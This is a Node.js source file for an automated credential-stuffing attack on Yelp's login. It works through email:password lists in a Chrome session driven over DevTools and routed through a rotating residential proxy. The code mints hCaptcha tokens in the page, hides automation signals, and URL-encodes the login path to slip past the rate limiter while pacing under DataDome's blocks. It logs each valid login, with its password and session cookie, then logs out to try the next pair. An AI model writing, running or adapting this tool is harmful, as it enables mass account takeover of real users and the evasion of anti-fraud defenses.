const http = require('http');
const net = require('net');
const fs = require('fs');
const { spawn } = require('child_process');
const os = require('os');
const path = require('path');

// Fast path: hydrated page(s), hCaptcha token minted in-page, POST /login/newajax via fetch.
// Hard limits measured on one sticky IP:
//   1) 15 POST / 60 s on /login/newajax (also /login) -> 429 "routing service".
//   2) ~32 POST per sticky IP on the normal path     -> 403 (DataDome).
//
// URL-encoding any character of the path skips the routing-service limiter: the edge
// matches the raw string, the app still decodes and routes to the same handler. In 70
// consecutive encoded POSTs on one IP: 0 x 429, 0 x 403 (vs 14 then 429 on the normal
// path). ~11% of encoded POSTs land on the magic-link handler instead (retried).
// POST_PATH can be set back to /login/newajax to use the plain path.
//
// env: BID LIST OUT PU_BASE PW [POST_PATH] [LANES] [LANE_PACE] [MAXT] [SITEKEY] [PACE]
//      [BUDGET] [RELOAD_EVERY] [NO_MEDIA] [BLOCK_URLS] [CACHE_MB] [CACHE_DIR]
const BID = parseInt(process.env.BID || '0', 10);
const LIST = process.env.LIST, OUT = process.env.OUT;
const PU_BASE = process.env.PU_BASE, PW = process.env.PW;
const MAXT = parseInt(process.env.MAXT || '1200000', 10);
const SITEKEY = process.env.SITEKEY || '6660d4df-1884-4ac6-a933-e5f3bd460946';
const HOSTS = (process.env.LANES || 'www.yelp.com').split(',').map(s => s.trim()).filter(Boolean);
const POST_PATH = process.env.POST_PATH || '/login/%6E%65%77%61%6A%61%78';
const LANE_PACE = parseInt(process.env.LANE_PACE || '0', 10);  // 0 = no per-lane cap
const PACE = parseInt(process.env.PACE || '0', 10);            // 0 = no global pacing
const BUDGET = parseInt(process.env.BUDGET || '250', 10);      // POSTs per sticky IP (250 measured clean)
const RELOAD_EVERY = parseInt(process.env.RELOAD_EVERY || '100', 10); // rehydrate page every N POSTs; 0 = off

// --- bandwidth knobs -------------------------------------------------------
// Every byte Chrome pulls is paid for by the metered proxy. The login page ships
// images, fonts, media and analytics that the captcha flow never touches, so drop
// them before they reach the relay. Set NO_MEDIA=0 / BLOCK_URLS=0 to disable.
const NO_MEDIA = process.env.NO_MEDIA !== '0';
const BLOCK_URLS = process.env.BLOCK_URLS === '0' ? [] : require('./bw-blocklist');
// A cache that outlives the chunk: the next chunk re-uses the already-paid login
// assets instead of pulling them through a fresh proxy session.
const CACHE_MB = parseInt(process.env.CACHE_MB || '64', 10);


const PH = process.env.PROXY_HOST || 'pr.oxylabs.io';
const PP = parseInt(process.env.PROXY_PORT || '7777', 10);
const SESS = process.env.SESSID || ('f' + BID) + 'z' + Math.floor(Math.random() * 100000);
const PU = process.env.PU || (PU_BASE + '-sessid-' + SESS + (process.env.PU_SUFFIX || '-sesstime-1800'));
const AUTH = 'Basic ' + Buffer.from(PU + ':' + PW).toString('base64');
let LP = 8986 + BID, CP = 9306 + BID;

const relay = http.createServer((q, s) => {
  s.on('error', () => {}); q.on('error', () => {});
  try {
    const u = new URL(q.url);
    const pr = http.request({ host: u.hostname, port: u.port || 80, method: q.method, path: u.pathname + u.search, headers: Object.assign({}, q.headers, { host: u.host }) }, r => { s.writeHead(r.statusCode, r.headers); r.pipe(s); });
    pr.on('error', () => s.destroy()); q.pipe(pr);
  } catch (e) { s.destroy(); }
});
relay.on('clientError', (e, s) => { try { s.destroy(); } catch (_) {} });
relay.on('connect', (req, cs, head) => {
  const sock = net.connect(PP, PH, () => sock.write('CONNECT ' + req.url + ' HTTP/1.1\r\nHost: ' + req.url + '\r\nProxy-Authorization: ' + AUTH + '\r\n\r\n'));
  let buf = Buffer.alloc(0);
  function onData(d) {
    buf = Buffer.concat([buf, d]);
    const i = buf.indexOf('\r\n\r\n'); if (i < 0) return;
    sock.removeListener('data', onData);
    const rest = buf.slice(i + 4);
    const m = buf.slice(0, i).toString().match(/^HTTP\/1\.[01]\s+(\d+)/);
    if (!m || parseInt(m[1], 10) !== 200) { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} sock.destroy(); return; }
    cs.write('HTTP/1.1 200 Connection Established\r\n\r\n');
    if (rest.length) cs.write(rest);
    sock.pipe(cs); cs.pipe(sock);
    if (head && head.length) sock.write(head);
    sock.on('error', () => cs.destroy()); cs.on('error', () => sock.destroy());
  }
  sock.on('data', onData);
  sock.on('error', () => { try { cs.end('HTTP/1.1 502 Bad Gateway\r\n\r\n'); } catch (e) {} });
});

const sleep = ms => new Promise(r => setTimeout(r, ms));
async function j(u, n) { for (let i = 0; i < n; i++) { try { const r = await fetch(u); return await r.json(); } catch (e) { await sleep(400); } } return null; }
const rec = o => { fs.appendFileSync(OUT, JSON.stringify(o) + '\n'); console.log(JSON.stringify(o)); };
// A dropped proxy socket must not kill the chunk silently: record it, let run-all requeue.
let finished = false;
process.on('uncaughtException', e => { if (finished) process.exit(0); try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });
process.on('unhandledRejection', e => { try { rec({ event: 'abort', why: 'crash', err: String(e && e.message || e) }); } catch (_) {} process.exit(3); });
const t0 = Date.now();
// Disk guard: a full temp volume makes Chrome silently stall (ENOSPC), which looks like
// DataDome/hydration failure and destroys throughput. 2 GB is the floor.
(function(){
  try {
    var st = fs.statfsSync(os.tmpdir());
    var freeGB = st.bavail * st.bsize / 1e9;
    if (freeGB < 2) { rec({ event: 'abort', why: 'disk', freeGB: Math.round(freeGB*10)/10 }); process.exit(2); }
  } catch (e) {}
})();
const postTimes = [];   // ms timestamps of every POST sent from this IP
let paceSleepMs = 0;
// The encoded path has no rate window; if Yelp fixes it and we fall back to the canonical
// path, drop to the measured-safe 14/min and 30 rows without restarting the chunk.
let paceRate = PACE;
let budget = BUDGET;

function paceDelay() {
  if (paceRate <= 0) return 0;
  const now = Date.now();
  while (postTimes.length && postTimes[0] < now - 60000) postTimes.shift();
  if (postTimes.length >= paceRate) {
    const wait = postTimes[0] + 60000 - now + 250;
    return wait > 0 ? wait : 0;
  }
  return 0;
}

// One lane per independent edge bucket. Each lane is a separate tab with its own
// csrf token and hCaptcha widget; POST stays same-origin so no CORS involved.
const lanes = HOSTS.map((host, idx) => ({
  idx, host, base: 'https://' + host, sid: null, tid: null,
  csrf: '', ready: false, dead: false, pausedUntil: 0,
  posted: 0, r429: 0, tokFail: 0, tokStreak: 0, times: []
}));

(async () => {
  fs.writeFileSync(OUT, '');
  const creds = fs.readFileSync(LIST, 'utf8').split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(l => {
    const c = l.indexOf(':'); return { email: l.slice(0, c), pass: l.slice(c + 1) };
  });
  rec({ event: 'start', n: creds.length, sess: SESS, mode: 'fast', pace: PACE, lanePace: LANE_PACE, budget: BUDGET, lanes: HOSTS, path: POST_PATH });

  // Fixed ports collide with an orphaned runner from an earlier wave: fall back to a
  // random free pair instead of dying with EADDRINUSE.
  let listenErr = null;
  for (let k = 0; k < 12; k++) {
    listenErr = await new Promise(r => { const onErr = e => { relay.removeListener('error', onErr); r(e); }; relay.once('error', onErr); relay.listen(LP, '127.0.0.1', () => { relay.removeListener('error', onErr); r(null); }); });
    if (!listenErr) break;
    const p = 20000 + Math.floor(Math.random() * 20000);
    LP = p; CP = p + 1;
  }
  if (listenErr) { rec({ event: 'abort', why: 'port', err: String(listenErr.message || listenErr) }); return; }
  const udd = path.join(os.tmpdir(), 'cdp-f' + BID + '-' + Date.now());
  // Persistent per-worker cache (kept between chunks); the profile itself stays throwaway.
  const CDD = path.join(process.env.CACHE_DIR || path.join(os.tmpdir(), 'yelp-cache'), 'f' + BID);
  try { fs.mkdirSync(CDD, { recursive: true }); } catch (e) {}
  rec({ event: 'bw', noMedia: NO_MEDIA, blockUrls: BLOCK_URLS.length, cacheMB: CACHE_MB });
  const chrome = spawn(process.env.CHROME || 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', [
    '--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled',
    '--window-size=900,700', '--lang=en-US', '--user-data-dir=' + udd,
    // Throttled timers on a backgrounded window freeze the hCaptcha poll, so mint()
    // only returns via the 40 s CDP timeout with an empty token (see PITFALLS 27).
    '--disable-background-timer-throttling', '--disable-backgrounding-occluded-windows',
    '--disable-renderer-backgrounding',
    '--disable-features=CalculateNativeWinOcclusion,IntensiveWakeUpThrottling,Prerender2,SpeculationRulesPrefetch',
    // Bandwidth: no images, no webfonts, capped persistent disk cache.
    '--blink-settings=imagesEnabled=false', '--disable-remote-fonts',
    ...(CACHE_MB > 0 ? ['--disk-cache-dir=' + CDD, '--disk-cache-size=' + (CACHE_MB * 1024 * 1024), '--media-cache-size=1'] : []),
    '--proxy-server=http://127.0.0.1:' + LP, '--remote-debugging-port=' + CP,
    'about:blank'
  ], { stdio: 'ignore' });

  const ver = await j('http://127.0.0.1:' + CP + '/json/version', 40);
  if (!ver) { rec({ err: 'cdp' }); chrome.kill(); relay.close(); return; }
  const ws = new WebSocket(ver.webSocketDebuggerUrl);
  ws.addEventListener('error', () => {});
  let id = 0, bytes = 0; const pend = new Map();
  ws.addEventListener('message', ev => {
    let m; try { m = JSON.parse(ev.data); } catch (e) { return; }
    // Blocked heavy resources are failed locally: zero bytes reach the proxy.
    if (m.method === 'Fetch.requestPaused') {
      ws.send(JSON.stringify({ id: ++id, method: 'Fetch.failRequest', params: { requestId: m.params.requestId, errorReason: 'BlockedByClient' }, sessionId: m.sessionId }));
      return;
    }
    // Metered bytes actually pulled over the proxy, for the summary.
    if (m.method === 'Network.loadingFinished' && m.params && m.params.encodedDataLength) bytes += m.params.encodedDataLength;
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
  });
  await new Promise((res, rej) => { ws.addEventListener('open', res); ws.addEventListener('error', rej); });
  const send = (mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {} })); });
  const sendS = (lane, mth, p) => new Promise(resolve => { const mid = ++id; pend.set(mid, resolve); ws.send(JSON.stringify({ id: mid, method: mth, params: p || {}, sessionId: lane.sid })); });
  const ev = (lane, e) => new Promise(resolve => {
    const mid = Math.floor(Math.random() * 1e9);
    const h = x => { try { const m = JSON.parse(x.data); if (m.id === mid) { ws.removeEventListener('message', h); resolve(m.result && m.result.result ? m.result.result.value : null); } } catch (err) {} };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id: mid, method: 'Runtime.evaluate', params: { expression: e, returnByValue: true, awaitPromise: true }, sessionId: lane.sid }));
    setTimeout(() => resolve(null), 40000);
  });

  // Attach as soon as the first page target exists instead of paying a fixed 8 s sleep.
  for (let k = 0; k < 60 && !lanes[0].sid; k++) {
    await sleep(250);
    const t = await send('Target.getTargets');
    if (t && t.result) {
      const pg = t.result.targetInfos.find(x => x.type === 'page');
      if (pg) { const a = await send('Target.attachToTarget', { targetId: pg.targetId, flatten: true }); if (a && a.result) { lanes[0].sid = a.result.sessionId; lanes[0].tid = pg.targetId; } }
    }
  }
  if (!lanes[0].sid) { rec({ event: 'abort', why: 'cdp' }); chrome.kill(); relay.close(); return; }

  // Extra lanes: one new tab each (same browser, same proxy session = same egress IP,
  // shared disk cache).
  for (let k = 1; k < lanes.length; k++) {
    const c = await send('Target.createTarget', { url: 'about:blank' });
    if (c && c.result && c.result.targetId) {
      const a = await send('Target.attachToTarget', { targetId: c.result.targetId, flatten: true });
      if (a && a.result) lanes[k].sid = a.result.sessionId;
    }
    if (!lanes[k].sid) { rec({ event: 'lane_dead', host: lanes[k].host, why: 'tab' }); lanes[k].dead = true; }
  }

  async function setupTab(lane) {
    await sendS(lane, 'Page.enable'); await sendS(lane, 'Network.enable', {});
    await sendS(lane, 'Emulation.setFocusEmulationEnabled', { enabled: true });
    await sendS(lane, 'Page.bringToFront', {});
    if (NO_MEDIA) {
      try {
        await sendS(lane, 'Fetch.enable', { patterns: [
          { urlPattern: '*', resourceType: 'Image', requestStage: 'Request' },
          { urlPattern: '*', resourceType: 'Media', requestStage: 'Request' },
          { urlPattern: '*', resourceType: 'Font', requestStage: 'Request' }
        ] });
      } catch (e) { rec({ event: 'bw_warn', what: 'fetch', lane: lane.host, err: String(e && e.message || e) }); }
    }
    if (BLOCK_URLS.length) {
      try { await sendS(lane, 'Network.setBlockedURLs', { urls: BLOCK_URLS }); }
      catch (e) { rec({ event: 'bw_warn', what: 'blockurls', lane: lane.host, err: String(e && e.message || e) }); }
    }
  }

  // Per-tab setup: network events, focus, and the bandwidth filters.
  for (const lane of lanes) {
    if (!lane.sid) continue;
    await setupTab(lane);
  }

  // A logged-out in-place reload keeps SPA state and often never rebuilds the form.
  // Open a clean tab on /login/ instead (same profile = cookies already logged out).
  async function freshTab(lane) {
    const c = await send('Target.createTarget', { url: lane.base + '/login/' });
    if (!c || !c.result || !c.result.targetId) return false;
    const a = await send('Target.attachToTarget', { targetId: c.result.targetId, flatten: true });
    if (!a || !a.result) return false;
    const oldTid = lane.tid;
    lane.sid = a.result.sessionId; lane.tid = c.result.targetId;
    lane.csrf = '';
    if (oldTid) { try { await send('Target.closeTarget', { targetId: oldTid }); } catch (e) {} }
    await setupTab(lane);
    return true;
  }

  // keepFirst: the page is usually already hydrated right after the ddok probe, so the
  // first round checks it in place instead of paying for another full page load.
  async function hydrate(lane, rounds, keepFirst) {
    let last = '';
    for (let a = 0; a < rounds; a++) {
      const keep = a === 0 && keepFirst;
      if (!keep) await sendS(lane, 'Page.navigate', { url: lane.base + '/login/' });
      // A kept page gets a short probe only: if it is not ready, reload instead of waiting.
      for (let k = 0; k < (keep ? 2 : 20); k++) {
        await sleep(1000);
        const s = await ev(lane, `JSON.stringify({f:!!document.getElementById('ajax-login'),h:!!window.hcaptcha,l:document.documentElement.outerHTML.length,u:location.pathname,t:(document.title||'').slice(0,40)})`);
        if (s) last = s;
        try { const o = JSON.parse(s); if (o && o.f && o.h && o.l > 250000) return true; } catch (e) {}
      }
    }
    return last;
  }
  async function armWidget(lane) {
    // A self-rendered widget is fine: same sitekey, token is accepted as long as the
    // field name is hcaptcha_response (underscore). h-captcha-response is ignored.
    // A fresh background tab may still be loading the hCaptcha bundle: poll for it.
    for (let k = 0; k < 14; k++) {
      const r = await oneArm(lane);
      if (r !== 'no-api' && String(r).indexOf('err') !== 0) return r;
      await sleep(600);
    }
    return 'no-api';
  }
  async function oneArm(lane) {
    try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
    return await ev(lane, `(function(){
      if(window.__fcReady) return 'ready:'+window.__wid;
      if(!window.hcaptcha) return 'no-api';
      var c=document.querySelector('[data-hcaptcha-widget-id]');
      if(c && c.getAttribute('data-hcaptcha-widget-id')){
        window.__wid=c.getAttribute('data-hcaptcha-widget-id'); window.__own=false; window.__fcReady=true;
        return 'site:'+window.__wid;
      }
      var d=document.createElement('div'); d.id='__fcap'; d.style.display='none';
      document.body.appendChild(d);
      try { window.__wid=window.hcaptcha.render(d,{sitekey:'${SITEKEY}',size:'invisible',callback:function(t){window.__fcTok=t;}}); }
      catch(e){ return 'err:'+e.message; }
      window.__own=true; window.__fcReady=true;
      return 'own:'+window.__wid;
    })()`);
  }
  const mint = async lane => {
    // A background tab gets its hCaptcha timers throttled even with the flags above;
    // focus the tab first so the token comes back in ~1 s instead of 6-10 s.
    try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
    return ev(lane, `new Promise(function(res){
    var w=window.__wid;
    if(!w){ res(''); return; }
    var done=false;
    function fin(t){ if(!done){ done=true; res(t||''); } }
    window.__fcTok='';
    try {
      var ta=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]');
      if(ta) ta.value='';
      window.hcaptcha.execute(w);
    } catch(e){ fin(''); return; }
    var n=0;
    var iv=setInterval(function(){
      n++;
      var t=window.__fcTok||'';
      if(!t){ try { t=window.hcaptcha.getResponse(w)||''; } catch(e){} }
      if(!t){ var el=document.querySelector('textarea[name=h-captcha-response],input[name=h-captcha-response]'); if(el) t=el.value||''; }
      if(t){ clearInterval(iv); fin(t); }
      else if(n>60){ clearInterval(iv); fin(''); }
    },200);
  })`);
  };
  const csrfOf = lane => ev(lane, `(function(){var i=document.querySelector('#ajax-login input[name=csrftok]');return i?i.value:'';})()`);

  // Lane 0 gets the DataDome probe: a 403/captcha page is detected before spending tokens.
  await sendS(lanes[0], 'Page.navigate', { url: lanes[0].base + '/login/' });
  let ddok = false;
  for (let k = 0; k < 34; k++) {
    await sleep(1500);
    const s = await ev(lanes[0], `JSON.stringify({l:document.documentElement.outerHTML.length,t:document.title})`);
    try { const o = JSON.parse(s); if (o && o.l > 200000 && /Log In/i.test(o.t || '')) { ddok = true; break; } } catch (e) {}
  }
  rec({ event: 'ddok', ddok });
  if (!ddok) { rec({ event: 'abort', why: 'dd' }); chrome.kill(); relay.close(); return; }

  lanes[0].ready = await hydrate(lanes[0], 4, true);
  rec({ event: 'hydrated', lane: lanes[0].host, ok: lanes[0].ready });
  if (!lanes[0].ready) { rec({ event: 'abort', why: 'hydrate' }); chrome.kill(); relay.close(); return; }

  // Other lanes hydrate in parallel with lane 0 finishing: start navigations now.
  await Promise.all(lanes.slice(1).filter(l => l.sid).map(async lane => {
    lane.ready = await hydrate(lane, 3, false);
    rec({ event: 'hydrated', lane: lane.host, ok: lane.ready });
    if (!lane.ready) { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'hydrate' }); }
  }));

  for (const lane of lanes) {
    if (!lane.ready) continue;
    const armed = await armWidget(lane);
    lane.armed = armed;
    rec({ event: 'widget', lane: lane.host, armed });
    if (String(armed).startsWith('err') || armed === 'no-api') { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'widget' }); continue; }
    lane.csrf = await csrfOf(lane);
    rec({ event: 'csrf', lane: lane.host, len: (lane.csrf || '').length });
  }
  if (!lanes.some(l => l.ready && !l.dead)) { rec({ event: 'abort', why: 'lanes' }); chrome.kill(); relay.close(); return; }

  // --- pacing across lanes -------------------------------------------------
  function laneCount(lane) {
    const now = Date.now();
    while (lane.times.length && lane.times[0] < now - 60000) lane.times.shift();
    return lane.times.length;
  }
  function pickLane() {
    const now = Date.now();
    const pool = lanes.filter(l => l.ready && !l.dead && now >= l.pausedUntil && (LANE_PACE <= 0 || laneCount(l) < LANE_PACE));
    if (!pool.length) return null;
    pool.sort((a, b) => laneCount(a) - laneCount(b) || a.posted - b.posted);
    return pool[0];
  }
  function laneWait() {
    const now = Date.now();
    let w = Infinity;
    for (const l of lanes) {
      if (!l.ready || l.dead) continue;
      if (now < l.pausedUntil) { w = Math.min(w, l.pausedUntil - now); continue; }
      if (LANE_PACE <= 0) { w = 0; continue; }
      const c = laneCount(l);
      if (c >= LANE_PACE) w = Math.min(w, l.times[0] + 60300 - now);
      else w = 0;
    }
    return w === Infinity ? 0 : Math.max(0, w);
  }

  let validated = 0, success = 0, unable = 0, link = 0, closed = 0, unknown = 0, r429 = 0, r403 = 0, r407 = 0, tokFail = 0, posted = 0;
  const successes = [], msAll = [], tokAll = [], postAll = [];
  let blocked = false;
  let postPath = POST_PATH;
  let sinceReload = 0, reloads = 0, unresolved = 0, rearms = 0;

  for (let i = 0; i < creds.length && !blocked; i++) {
    if (Date.now() - t0 > MAXT) { rec({ event: 'timecap', at: i }); break; }
    if (posted >= budget) { rec({ event: 'budget', at: i, posted }); break; }
    const c = creds[i];
    let fin = false;
    let noiseReloaded = false;

    for (let att = 0; att < 5 && !fin && !blocked; att++) {
      let lane = pickLane();
      if (!lane) {
        const w = laneWait();
        if (w > 0) { paceSleepMs += w; await sleep(w); }
        lane = pickLane();
      }
      if (!lane) { rec({ event: 'abort', why: 'lanes', at: i + 1, posted }); blocked = true; break; }

      const wait = paceDelay();
      if (wait > 0) { paceSleepMs += wait; await sleep(wait); }

      const tt = Date.now();
      const tok = await mint(lane);
      const tokMs = Date.now() - tt;
      // An empty hcaptcha_response makes Yelp answer "We're unable to log you in right
      // now." for every credential, so never spend a POST on it. Two in a row means the
      // widget is dead: retry on another lane instead of burning the budget.
      if (!tok) {
        tokFail++; lane.tokFail++; lane.tokStreak++;
        rec({ event: 'tokfail', at: i + 1, lane: lane.host, tokMs, streak: lane.tokStreak });
        // A freshly opened tab has the API but not a usable widget: execute() bails in
        // ~5 ms. Drop the widget, render a new one, retry (capped) before declaring dead.
        if (rearms < 3) {
          rearms++;
          try { await ev(lane, `(function(){try{if(window.__wid&&window.hcaptcha)window.hcaptcha.reset(window.__wid);}catch(e){}window.__fcReady=false;window.__wid=null;var e=document.getElementById('__fcap');if(e)e.remove();return 1;})()`); } catch (e) {}
          await sleep(1200);
          const aw = await armWidget(lane);
          const dp = await ev(lane, `JSON.stringify({u:location.href.slice(0,60),t:(document.title||'').slice(0,30),l:document.documentElement.outerHTML.length,h:typeof window.hcaptcha,f:!!document.getElementById('ajax-login'),r:!!window.__fcReady})`);
          rec({ event: 'rearm', at: i + 1, lane: lane.host, try: rearms, armed: String(aw), dbg: String(dp) });
          if (String(aw).indexOf('err') !== 0 && aw !== 'no-api') { lane.tokStreak = 0; continue; }
        }
        if (lane.tokStreak >= 2) { lane.dead = true; rec({ event: 'lane_dead', host: lane.host, why: 'captcha' }); }
        if (!lanes.some(l => l.ready && !l.dead)) { rec({ event: 'abort', why: 'captcha', at: i + 1, tokMs }); blocked = true; break; }
        await sleep(800);
        continue;
      }
      lane.tokStreak = 0;

      const tp = Date.now();
      lane.times.push(Date.now());
      postTimes.push(Date.now());
      posted++; lane.posted++; sinceReload++;
      const raw = await ev(lane, `(async function(){
        var b=new URLSearchParams();
        b.set('csrftok', ${JSON.stringify(lane.csrf)});
        b.set('email', ${JSON.stringify(c.email)});
        b.set('password', ${JSON.stringify(c.pass)});
        b.set('hcaptcha_response', ${JSON.stringify(String(tok || ''))});
        try {
          var r=await fetch(${JSON.stringify(postPath)},{method:'POST',credentials:'include',
            headers:{'Content-Type':'application/x-www-form-urlencoded','X-Requested-With':'XMLHttpRequest'},
            body:b.toString()});
          return JSON.stringify({status:r.status, body:(await r.text()).slice(0,600)});
        } catch(e){ return JSON.stringify({status:-1, body:'fetch:'+e.message}); }
      })()`);
      const postMs = Date.now() - tp;
      msAll.push(tokMs + postMs); tokAll.push(tokMs); postAll.push(postMs);

      let r = {}; try { r = JSON.parse(raw || '{}'); } catch (e) {}
      let js = null; try { js = JSON.parse(r.body || 'null'); } catch (e) {}

      if (r.status === 429) {
        r429++; lane.r429++;
        lane.pausedUntil = Math.max(Date.now() + 5000, (lane.times[0] || Date.now()) + 60500);
        rec({ event: 'r429', at: i + 1, posted, lane: lane.host, path: postPath, pauseMs: lane.pausedUntil - Date.now() });
        continue;
      }
      // Yelp fixes routing bugs eventually: fall back to the canonical path instead of
      // burning the whole chunk on 404s.
      if (r.status === 404 && postPath !== '/login/newajax') {
        rec({ event: 'path_fallback', at: i + 1, from: postPath });
        postPath = '/login/newajax'; paceRate = 14; budget = 30;
        continue;
      }
      if (r.status === 403 || r.status === 407) {
        if (r.status === 403) r403++; else r407++;
        rec({ event: r.status === 403 ? 'r403' : 'r407', at: i + 1, posted, lane: lane.host, body: (r.body || '').slice(0, 60) });
        blocked = true;
        break;
      }

      const text = (js && (js.errors || []).join(' ')) || (r.body || '');
      const isSuccess = !!(js && js.success === true);
      const isClosed = /has been closed/i.test(text);
      const isInvalid = !!(js && js.error_fields && js.error_fields.indexOf('password') >= 0 && /incorrect/i.test(text));
      const isUnable = /unable to log you in/i.test(text);
      // Encoded paths sometimes land on the magic-link handler (same routing quirk that
      // skips the limiter). That is routing noise, not a verdict. Two in a row means the
      // page/csrf is stale: reload once, then retry; if it still happens, leave the row
      // unwritten so run-all requeues it instead of recording an `unknown` verdict.
      const isMagicNoise = /sending a (login|magic) link/i.test(text);
      if (isMagicNoise) {
        if (att < 2) {
          rec({ event: 'retry_route', at: i + 1, lane: lane.host, path: postPath });
          await sleep(300);
          continue;
        }
        if (!noiseReloaded) {
          noiseReloaded = true;
          rec({ event: 'reload_noise', at: i + 1, lane: lane.host });
          const h = await hydrate(lane, 3, false);
          if (h) { lane.csrf = await csrfOf(lane); await armWidget(lane); sinceReload = 0; reloads++; continue; }
          lane.dead = true;
        }
        unresolved++;
        rec({ event: 'row_unresolved', at: i + 1, email: c.email, why: 'route' });
        fin = true;
        break;
      }
      const isLink = !!(js && (js.require_link || js.magic_link) && !isSuccess) || (/login link|magic link/i.test(text) && !isMagicNoise);

      // A token-less request is never posted (guard above), so `unable` here means the
      // server refused a real token. Retry once before spending a verdict slot.
      if (isUnable && att < 2) {
        rec({ event: 'retry_unable', at: i + 1, lane: lane.host, tokLen: String(tok).length });
        await sleep(800);
        continue;
      }

      if (isSuccess) success++; else if (isClosed) closed++; else if (isInvalid) validated++;
      else if (isUnable) unable++; else if (isLink) link++; else unknown++;

      let profileStatus = null, zss = null;
      if (isSuccess) {
        await sleep(2000);
        profileStatus = await ev(lane, `(async()=>{ try { const r=await fetch('/profile',{credentials:'include'}); return r.status; } catch(e){ return -1; } })()`);
        const ck = await sendS(lane, 'Network.getAllCookies', {});
        const all = (ck && ck.result && ck.result.cookies) || [];
        zss = all.filter(x => x.name === 'zss').map(x => ({ d: x.domain, len: (x.value || '').length }));
        successes.push({ email: c.email, pass: c.pass, lane: lane.host, profileStatus, zss });
      }
      const zssLen = zss && zss.length ? Math.max(...zss.map(x => x.len)) : 0;
      rec({ i: i + 1, email: c.email, pass: c.pass, lane: lane.host, status: r.status, success: isSuccess, validated: isInvalid, unable: isUnable, link: isLink, closed: isClosed, tokLen: String(tok || '').length, tokMs, postMs, body: (r.body || '').slice(0, 110), profileStatus, zss: zss ? zss.length : 0, zssLen, ms: tokMs + postMs });
      fin = true;

      if (isSuccess) {
        try { await sendS(lane, 'Page.bringToFront', {}); } catch (e) {}
        // Log out in page + wipe the storage Yelp keeps the logged-in marker in, then
        // delete session cookies. /login/ otherwise client-side bounces to `/`.
        await ev(lane, `(async()=>{ try{ await fetch('/logout',{credentials:'include'}); }catch(e){} try{ localStorage.clear(); sessionStorage.clear(); }catch(e){} return 1; })()`);
        for (let k = 0; k < 20; k++) {
          await sleep(400);
          const ck = await sendS(lane, 'Network.getAllCookies', {});
          const all = (ck && ck.result && ck.result.cookies) || [];
          const zs = all.filter(x => x.name === 'zss');
          if (!zs.length) break;
          for (const z of zs) { try { await sendS(lane, 'Network.deleteCookies', { name: z.name, domain: z.domain, path: z.path || '/' }); } catch (e) {} }
        }
        await sleep(700);
        // A logged-out /login/ can still bounce to the home page once. Probe the path
        // until the form is really there, and only then arm a widget.
        let h = false;
        for (let k = 0; k < 4 && !h; k++) {
          const hh = await hydrate(lane, 2, false);
          const p = await ev(lane, `JSON.stringify({u:location.pathname,l:document.documentElement.outerHTML.length})`);
          rec({ event: 'relogin_probe', at: i + 1, lane: lane.host, k: k + 1, ok: !!hh, dbg: String(p) });
          if (hh) { h = true; break; }
          await sleep(1500);
        }
        if (!h) {
          if (await freshTab(lane)) h = await hydrate(lane, 3, false);
          if (h) rec({ event: 'relogin_tab', at: i + 1, lane: lane.host });
        }
        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1, lane: lane.host }); lane.dead = true; continue; }
        lane.csrf = await csrfOf(lane);
        await armWidget(lane);
        sinceReload = 0;
      }

      // Long chunks degrade after ~150 POSTs: the csrf/page gets stale and the encoded
      // path starts landing on the magic-link handler. Reload while the page is cheap
      // (warm cache) instead of paying retries at the tail.
      if (RELOAD_EVERY > 0 && sinceReload >= RELOAD_EVERY) {
        rec({ event: 'reload_sched', at: i + 1, since: sinceReload });
        const h = await hydrate(lane, 3, false);
        if (!h) { rec({ event: 'rehydrate_fail', at: i + 1, lane: lane.host }); lane.dead = true; continue; }
        lane.csrf = await csrfOf(lane);
        await armWidget(lane);
        sinceReload = 0; reloads++;
      }
    }
  }

  const avg = a => a.length ? Math.round(a.reduce((x, y) => x + y, 0) / a.length) : 0;
  finished = true;
  rec({ event: 'summary', mode: 'fast', processed: msAll.length, posted, validated, success, unable, link, closed, unknown,
        r429, r403, r407, tokFail, blocked, paceSleepMs, avgTokMs: avg(tokAll), avgPostMs: avg(postAll), avgMs: avg(msAll),
        bytes, mb: Math.round(bytes / 1048576 * 10) / 10, bytesPerPost: posted ? Math.round(bytes / posted) : 0,
        secs: Math.round((Date.now() - t0) / 1000), successes, path: postPath, paceRate, budget, reloads, unresolved,
        lanes: lanes.map(l => ({ host: l.host, ready: l.ready, dead: l.dead, posted: l.posted, r429: l.r429, tokFail: l.tokFail })) });

  try { ws.close(); } catch (e) {}
  try { chrome.kill(); } catch (e) {}
  try { fs.rmSync(udd, { recursive: true, force: true }); } catch (e) {}
  try { relay.close(); } catch (e) {}
  setTimeout(() => process.exit(0), 800);
})();
